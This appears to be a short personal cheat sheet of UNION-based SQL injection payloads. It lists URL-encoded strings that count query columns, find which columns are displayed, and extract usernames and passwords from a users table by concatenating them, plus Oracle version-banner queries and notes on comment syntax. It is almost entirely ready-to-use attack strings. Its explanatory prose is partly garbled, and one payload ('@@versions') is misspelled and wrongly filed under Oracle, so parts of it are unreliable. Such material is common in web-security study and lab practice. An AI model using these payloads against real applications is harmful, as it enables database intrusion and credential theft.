UNION BASED ATTACK: 

'+UNION+SELECT+NULL,NULL,NULL-- -
'+UNION+SELECT+NULL,NULL,NULL--
'+UNION+SELECT+NULL,NULL,NULL,NULL,NULL-- -
'+UNION+SELECT+username,+password+FROM+users--

For confirming which column holds data we can add string to it like:
'+UNION+SELECT+'def',NULL,NULL-- -  |> here we can see the first column if balance the first column will hold data but how its happen let me tell you: because it has data type so strings can hold string and int can hold integer

'+UNION+SELECT+NULL,username||'~'||password+From+users--    |> username || '~' || password concatenates the two columns into one string, which fits into a single reflected column—so the app displays username~password in that column while the other columns are filled with NULL.

ORACLE BASED:
'+UNION+SELECT+'abc','def'+FROM+dual--
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
'+UNION+SELECT+@@versions,NULL#

COMMENTS:
-- → SQL standard comment, needs a space after it, works in most DBs
-- - → same as -- , extra - is just safe padding
# → MySQL-only comment, no space needed
